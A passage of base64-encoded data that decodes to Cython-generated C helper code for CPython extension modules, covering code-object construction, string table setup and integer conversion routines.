biAgICAgICAgaWYgKHR5cGUpIHtcbiAgICAgICAgICAgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRyYWNlYmFjayk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMDAwXG4gIHN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqYywgUHlPYmplY3QqIG4sIFB5T2JqZWN0ICp2LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpyZXN1bHQ7XG4gICAgcmVzdWx0ID1cbiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgICAgIFB5VW5zdGFibGVfQ29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbHNlXG4gICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbmRpZlxuICAgICAgICAoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBuYW1lLCBmbGluZSwgbG5vcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBjMDBBMVxuICAgIGlmIChsaWtlbHkocmVzdWx0KSlcbiAgICAgICAgcmVzdWx0LT5fY29fZmlyc3R0cmFjZWFibGUgPSAwO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4gIH1cbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjIgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAjZGVmaW5lIF9fUHl4X19QeUNvZGVfTmV3KGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXFxcbiAgICAgICAgICBQeUNvZGVfTmV3V2l0aFBvc09ubHlBcmdzKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X19QeUNvZGVfTmV3KGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXFxcbiAgICAgICAgICBQeUNvZGVfTmV3KGEsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldyhcbiAgICAgICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjcixcbiAgICAgICAgUHlPYmplY3QgKiBjb25zdCAqdmFybmFtZXMsXG4gICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSxcbiAgICAgICAgUHlPYmplY3QgKmZ1bmNuYW1lLFxuICAgICAgICBjb25zdCBjaGFyICpsaW5lX3RhYmxlLFxuICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwXG4pIHtcbiAgICBQeU9iamVjdCAqY29kZV9vYmogPSBOVUxMLCAqdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBOVUxMLCAqY29kZV9ieXRlcyA9IE5VTEwsICpsaW5lX3RhYmxlX2J5dGVzID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzO1xuICAgIFB5T2JqZWN0ICp2YXJuYW1lc190dXBsZSA9IFB5VHVwbGVfTmV3KHZhcl9jb3VudCk7XG4gICAgaWYgKHVubGlrZWx5KCF2YXJuYW1lc190dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYodmFybmFtZXNbaV0pO1xuICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YXJuYW1lc190dXBsZSwgaSwgdmFybmFtZXNbaV0pICE9ICgwKSkgZ290byBkb25lO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gUHlEaWN0X0dldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSk7XG4gICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkge1xuICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSwgdmFybmFtZXNfdHVwbGUpIDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSB2YXJuYW1lc190dXBsZTtcbiAgICB9XG4gICAgI2Vsc2VcbiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9TZXREZWZhdWx0KHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUsIHZhcm5hbWVzX3R1cGxlKTtcbiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lO1xuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7XG4gICAgI2VuZGlmXG4gICAgaWYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGUgIT0gTlVMTFxuICAgICAgICAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkge1xuICAgICAgICBsaW5lX3RhYmxlX2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShsaW5lX3RhYmxlLCBkZXNjci5saW5lX3RhYmxlX2xlbmd0aCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbGluZV90YWJsZV9ieXRlcykpIGdvdG8gZG9uZTtcbiAgICAgICAgUHlfc3NpemVfdCBjb2RlX2xlbiA9IChkZXNjci5saW5lX3RhYmxlX2xlbmd0aCAqIDIgKyA0KSAmIH4zO1xuICAgICAgICBjb2RlX2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShOVUxMLCBjb2RlX2xlbik7XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9ieXRlcykpIGdvdG8gZG9uZTtcbiAgICAgICAgY2hhciogY19jb2RlX2J5dGVzID0gUHlCeXRlc19Bc1N0cmluZyhjb2RlX2J5dGVzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFjX2NvZGVfYnl0ZXMpKSBnb3RvIGRvbmU7XG4gICAgICAgIG1lbXNldChjX2NvZGVfYnl0ZXMsIDAsIChzaXplX3QpIGNvZGVfbGVuKTtcbiAgICB9XG4gICAgY29kZV9vYmogPSAoUHlPYmplY3QqKSBfX1B5eF9fUHlDb2RlX05ldyhcbiAgICAgICAgKGludCkgZGVzY3IuYXJnY291bnQsXG4gICAgICAgIChpbnQpIGRlc2NyLm51bV9wb3Nvbmx5X2FyZ3MsXG4gICAgICAgIChpbnQpIGRlc2NyLm51bV9rd29ubHlfYXJncyxcbiAgICAgICAgKGludCkgZGVzY3IubmxvY2FscyxcbiAgICAgICAgMCxcbiAgICAgICAgKGludCkgZGVzY3IuZmxhZ3MsXG4gICAgICAgIGNvZGVfYnl0ZXMgPyBjb2RlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgZmlsZW5hbWUsXG4gICAgICAgIGZ1bmNuYW1lLFxuICAgICAgICAoaW50KSBkZXNjci5maXJzdF9saW5lLFxuICAgICAgICAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAoMHgwMzBiMDAwMCkgJiYgbGluZV90YWJsZV9ieXRlcykgPyBsaW5lX3RhYmxlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXNcbiAgICApO1xuZG9uZTpcbiAgICBQeV9YREVDUkVGKGNvZGVfYnl0ZXMpO1xuICAgIFB5X1hERUNSRUYobGluZV90YWJsZV9ieXRlcyk7XG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfWERFQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7XG4gICAgI2VuZGlmXG4gICAgUHlfREVDUkVGKHZhcm5hbWVzX3R1cGxlKTtcbiAgICByZXR1cm4gY29kZV9vYmo7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcykge1xuICAgIHdoaWxlICh0LT5zKSB7XG4gICAgICAgIFB5T2JqZWN0ICpzdHI7XG4gICAgICAgIGlmICh0LT5pc191bmljb2RlKSB7XG4gICAgICAgICAgICBpZiAodC0+aW50ZXJuKSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcodC0+cyk7XG4gICAgICAgICAgICB9IGVsc2UgaWYgKHQtPmVuY29kaW5nKSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0RlY29kZSh0LT5zLCB0LT5uIC0gMSwgZW5jb2RpbmdfbmFtZXNbdC0+ZW5jb2RpbmddLCBOVUxMKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKHQtPnMsIHQtPm4gLSAxKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHN0ciA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpO1xuICAgICAgICB9XG4gICAgICAgIGlmICghc3RyKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAqdGFyZ2V0ID0gc3RyO1xuICAgICAgICBpZiAoUHlPYmplY3RfSGFzaChzdHIpID09IC0xKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICArK3Q7XG4gICAgICAgICsrdGFyZ2V0O1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cblxuI2luY2x1ZGUgPHN0cmluZy5oPlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9zc2l6ZV9zdHJsZW4oY29uc3QgY2hhciAqcykge1xuICAgIHNpemVfdCBsZW4gPSBzdHJsZW4ocyk7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA+IChzaXplX3QpIFBZX1NTSVpFX1RfTUFYKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImJ5dGUgc3RyaW5nIGlzIHRvbyBsb25nIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIChQeV9zc2l6ZV90KSBsZW47XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IF9fUHl4X3NzaXplX3N0cmxlbihjX3N0cik7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBsZW4pO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IF9fUHl4X3NzaXplX3N0cmxlbihjX3N0cik7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gUHlCeXRlQXJyYXlfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhQeU9iamVjdCogbykge1xuICAgIFB5X3NzaXplX3QgaWdub3JlO1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUobywgJmlnbm9yZSk7XG59XG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOFxuc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlVbmljb2RlX0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCogbywgUHlfc3NpemVfdCAqbGVuZ3RoKSB7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShvKSA9PSAtMSkpIHJldHVybiBOVUxMO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7XG4gICAgICAgIGNvbnN0IGNoYXIqIHJlc3VsdDtcbiAgICAgICAgUHlfc3NpemVfdCB1bmljb2RlX2xlbmd0aDtcbiAgICAgICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodW5pY29kZV9sZW5ndGgpOyAvLyBvbmx5IGZvciBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSVxuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5QXJnX1BhcnNlKG8sICJzIyIsICZyZXN1bHQsIGxlbmd0aCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUlcbiAgICAgICAgdW5pY29kZV9sZW5ndGggPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pO1xuICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIGlmICh1bmxpa2VseSh1bmljb2RlX2xlbmd0aCAhPSAqbGVuZ3RoKSkge1xuICAgICAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxzZVxuI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICAgaWYgKGxpa2VseShQeVVuaWNvZGVfSVNfQVNDSUkobykpKSB7XG4gICAgICAgICpsZW5ndGggPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKTtcbiAgICAgICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjgobyk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNlbHNlXG4gICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7XG4jZW5kaWZcbiNlbmRpZlxufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqIG8sIFB5X3NzaXplX3QgKmxlbmd0aCkge1xuI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIHx8IF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjhcbiAgICBpZiAoUHlVbmljb2RlX0NoZWNrKG8pKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKG8sIGxlbmd0aCk7XG4gICAgfSBlbHNlXG4jZW5kaWZcbiAgICBpZiAoUHlCeXRlQXJyYXlfQ2hlY2sobykpIHtcbiNpZiAoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAoZGVmaW5lZChQeUJ5dGVBcnJheV9BU19TVFJJTkcpICYmIGRlZmluZWQoUHlCeXRlQXJyYXlfR0VUX1NJWkUpKSlcbiAgICAgICAgKmxlbmd0aCA9IFB5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pO1xuICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQVNfU1RSSU5HKG8pO1xuI2Vsc2VcbiAgICAgICAgKmxlbmd0aCA9IFB5Qnl0ZUFycmF5X1NpemUobyk7XG4gICAgICAgIGlmICgqbGVuZ3RoID09IC0xKSByZXR1cm4gTlVMTDtcbiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKG8pO1xuI2VuZGlmXG4gICAgfSBlbHNlXG4gICAge1xuICAgICAgICBjaGFyKiByZXN1bHQ7XG4gICAgICAgIGludCByID0gUHlCeXRlc19Bc1N0cmluZ0FuZFNpemUobywgJnJlc3VsdCwgbGVuZ3RoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHIgPCAwKSkge1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgICAgICB9XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShQeU9iamVjdCogeCkge1xuICAgaW50IGlzX3RydWUgPSB4ID09IFB5X1RydWU7XG4gICBpZiAoaXNfdHJ1ZSB8ICh4ID09IFB5X0ZhbHNlKSB8ICh4ID09IFB5X05vbmUpKSByZXR1cm4gaXNfdHJ1ZTtcbiAgIGVsc2UgcmV0dXJuIFB5T2JqZWN0X0lzVHJ1ZSh4KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqIHgpIHtcbiAgICBpbnQgcmV0dmFsO1xuICAgIGlmICh1bmxpa2VseSgheCkpIHJldHVybiAtMTtcbiAgICByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoeCk7XG4gICAgUHlfREVDUkVGKHgpO1xuICAgIHJldHVybiByZXR2YWw7XG59XG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmdXcm9uZ1Jlc3VsdFR5cGUoUHlPYmplY3QqIHJlc3VsdCkge1xuICAgIF9fUHl4X1R5cGVOYW1lIHJlc3VsdF90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUocmVzdWx0KSk7XG4gICAgaWYgKFB5TG9uZ19DaGVjayhyZXN1bHQpKSB7XG4gICAgICAgIGlmIChQeUVycl9XYXJuRm9ybWF0KFB5RXhjX0RlcHJlY2F0aW9uV2FybmluZywgMSxcbiAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpLiAgIlxuICAgICAgICAgICAgICAgICJUaGUgYWJpbGl0eSB0byByZXR1cm4gYW4gaW5zdGFuY2Ugb2YgYSBzdHJpY3Qgc3ViY2xhc3Mgb2YgaW50IGlzIGRlcHJlY2F0ZWQsICJcbiAgICAgICAgICAgICAgICAiYW5kIG1heSBiZSByZW1vdmVkIGluIGEgZnV0dXJlIHZlcnNpb24gb2YgUHl0aG9uLiIsXG4gICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSkpIHtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpIixcbiAgICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmcoUHlPYmplY3QqIHgpIHtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgUHlOdW1iZXJNZXRob2RzICptO1xuI2VuZGlmXG4gIFB5T2JqZWN0ICpyZXMgPSBOVUxMO1xuICBpZiAobGlrZWx5KFB5TG9uZ19DaGVjayh4KSkpXG4gICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHgpO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICBtID0gUHlfVFlQRSh4KS0+dHBfYXNfbnVtYmVyO1xuICBpZiAobGlrZWx5KG0gJiYgbS0+bmJfaW50KSkge1xuICAgICAgcmVzID0gbS0+bmJfaW50KHgpO1xuICB9XG4jZWxzZVxuICBpZiAoIVB5Qnl0ZXNfQ2hlY2tFeGFjdCh4KSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoeCkpIHtcbiAgICAgIHJlcyA9IFB5TnVtYmVyX0xvbmcoeCk7XG4gIH1cbiNlbmRpZlxuICBpZiAobGlrZWx5KHJlcykpIHtcbiAgICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrRXhhY3QocmVzKSkpIHtcbiAgICAgICAgICByZXR1cm4gX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShyZXMpO1xuICAgICAgfVxuICB9XG4gIGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICJhbiBpbnRlZ2VyIGlzIHJlcXVpcmVkIik7XG4gIH1cbiAgcmV0dXJuIHJlcztcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqIGIpIHtcbiAgUHlfc3NpemVfdCBpdmFsO1xuICBQeU9iamVjdCAqeDtcbiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChiKSkpIHtcbiAgICAjaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgaWYgKGxpa2VseShfX1B5eF9QeUxvbmdfSXNDb21wYWN0KGIpKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShiKTtcbiAgICB9IGVsc2Uge1xuICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoYik7XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChiKTtcbiAgICAgIHN3aXRjaCAoc2l6ZSkge1xuICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gKFB5X3NzaXplX3QpICgoKCgoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gKFB5X3NzaXplX3QpICgoKCgoKChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIC0oUHlfc3NpemVfdCkgKCgoKCgoKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gNCAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiA0